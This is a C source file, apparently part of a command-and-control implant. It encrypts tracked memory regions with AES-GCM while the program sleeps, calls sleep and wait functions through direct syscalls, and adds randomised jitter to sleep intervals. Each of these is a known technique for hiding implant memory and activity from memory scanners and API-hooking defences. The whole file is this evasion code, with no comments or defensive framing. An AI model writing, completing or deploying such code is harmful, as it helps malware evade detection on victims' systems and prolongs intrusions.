#include "WaitMask.h"
#include "Syscalls.h"
#include "ApiLoader.h"
#include "Crypt.h"
#include "utils.h"

#define MAX_SLEEP_REGIONS 128
static PVOID g_SleepRegions[MAX_SLEEP_REGIONS];
static SIZE_T g_SleepRegionSizes[MAX_SLEEP_REGIONS];
static int g_SleepRegionCount = 0;
static BYTE g_SleepKey[16];

void SleepObfInit()
{
	for (int i = 0; i < 16; i++)
		g_SleepKey[i] = (BYTE)(GenerateRandom32() & 0xFF);
}

void SleepObfTrackRegion(PVOID addr, SIZE_T size)
{
	if (g_SleepRegionCount < MAX_SLEEP_REGIONS && size > (SIZE_T)(GCM_NONCE_SIZE + GCM_TAG_SIZE)) {
		g_SleepRegions[g_SleepRegionCount] = addr;
		g_SleepRegionSizes[g_SleepRegionCount] = size;
		g_SleepRegionCount++;
	}
}

static void SleepEncrypt()
{
	if (g_SleepRegionCount == 0) return;

	unsigned char* buf = NULL;

	for (int i = 0; i < g_SleepRegionCount; i++) {
		PBYTE p = (PBYTE)g_SleepRegions[i];
		SIZE_T sz = g_SleepRegionSizes[i];
		SIZE_T plainLen = sz - GCM_NONCE_SIZE - GCM_TAG_SIZE;

		if (plainLen <= 0) continue;

		buf = (unsigned char*)MemAllocLocal(sz);
		if (!buf) continue;
		memcpy(buf + GCM_NONCE_SIZE, p, plainLen);

		AESGCMEncrypt(buf + GCM_NONCE_SIZE, plainLen, g_SleepKey, buf, buf + GCM_NONCE_SIZE, buf + GCM_NONCE_SIZE + plainLen);
		memcpy(p, buf, sz);
		MemFreeLocal((LPVOID*)&buf, (ULONG)sz);
	}
}

static void SleepDecrypt()
{
	if (g_SleepRegionCount == 0) return;

	unsigned char* buf = NULL;

	for (int i = 0; i < g_SleepRegionCount; i++) {
		PBYTE p = (PBYTE)g_SleepRegions[i];
		SIZE_T sz = g_SleepRegionSizes[i];
		SIZE_T plainLen = sz - GCM_NONCE_SIZE - GCM_TAG_SIZE;

		if (plainLen <= 0) continue;

		buf = (unsigned char*)MemAllocLocal(plainLen);
		if (!buf) continue;

		if (AESGCMDecrypt(p + GCM_NONCE_SIZE, plainLen, g_SleepKey, p, buf, p + sz - GCM_TAG_SIZE)) {
			memcpy(p, buf, plainLen);
		}
		MemFreeLocal((LPVOID*)&buf, (ULONG)plainLen);
	}
}

void mySleep(ULONG ms) 
{
	if (ms == 0) return;
	SleepEncrypt();
	LARGE_INTEGER delay;
	delay.QuadPart = -(LONGLONG)(ms * 10000);
	NtDelayExecution_SYSCALL(FALSE, &delay);
	SleepDecrypt();
}

void WaitMask(ULONG worktime, ULONG sleepTime, ULONG jitter) 
{
	ULONG maxSleepTime = 0;
	if (worktime) {
		maxSleepTime = worktime * 1000;
	}
	else if (sleepTime) {
		maxSleepTime = sleepTime * 1000;
		if (jitter) {
			ULONG baseMs = maxSleepTime;
			ULONG halfRange = baseMs * jitter / 200;
			if (halfRange) {
				ULONG delta = GenerateRandom32() % (halfRange + 1);
				if (GenerateRandom32() & 1)
					maxSleepTime += delta;
				else
					maxSleepTime -= delta;
			}
		}
	}
	mySleep(maxSleepTime);
}

void WaitMaskWithEvent(HANDLE hEvent, ULONG worktime, ULONG sleepTime, ULONG jitter)
{
	ULONG maxSleepTime = 0;
	if (worktime) {
		maxSleepTime = worktime * 1000;
	}
	else if (sleepTime) {
		maxSleepTime = sleepTime * 1000;
		if (jitter) {
			ULONG baseMs = maxSleepTime;
			ULONG halfRange = baseMs * jitter / 200;
			if (halfRange) {
				ULONG delta = GenerateRandom32() % (halfRange + 1);
				if (GenerateRandom32() & 1)
					maxSleepTime += delta;
				else
					maxSleepTime -= delta;
			}
		}
	}

	if (hEvent) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = -(LONGLONG)(maxSleepTime * 10000);
		SleepEncrypt();
		NTSTATUS status = NtWaitForSingleObject_SYSCALL(hEvent, FALSE, &timeout);
		SleepDecrypt();
		if (status == 0)
			ApiWin->ResetEvent(hEvent);
	}
	else {
		ApiWin->Sleep(maxSleepTime);
	}
}
